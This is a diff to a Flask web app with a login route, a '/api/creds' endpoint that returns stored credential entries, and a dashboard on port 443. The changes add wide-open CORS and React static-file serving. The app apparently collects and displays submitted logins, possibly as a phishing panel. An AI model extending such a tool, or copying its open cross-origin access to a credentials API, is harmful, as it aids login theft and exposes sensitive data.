@@ -1,11 +1,12 @@
-from flask import Flask, request, redirect, render_template, jsonify
+from flask import Flask, request, redirect, render_template, jsonify, send_from_directory
+from flask_cors import CORS
 from datetime import datetime
 import requests
 import os
 import ast
 
-
 app = Flask(__name__)
+CORS(app)  # Enable CORS for development
 
 @app.route('/', methods=['GET', 'POST'])
 def login():
@@ -35,9 +36,10 @@ def login():
 
     return render_template("login.html")
 
-
 @app.route('/dashboard')
 def dashboard():
+    if os.path.exists('frontend/build'):
+        return send_from_directory('frontend/build', 'index.html')
     return render_template("dashboard.html")
 
 @app.route('/api/creds')
@@ -53,6 +55,13 @@ def creds_api():
                 except Exception:
                     continue
     return jsonify(entries)
+
+# Serve static files from the React build directory
+@app.route('/static/<path:path>')
+def serve_static(path):
+    if os.path.exists('frontend/build/static'):
+        return send_from_directory('frontend/build/static', path)
+    return '', 404
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=443, ssl_context=('cert.crt', 'cert.key'))
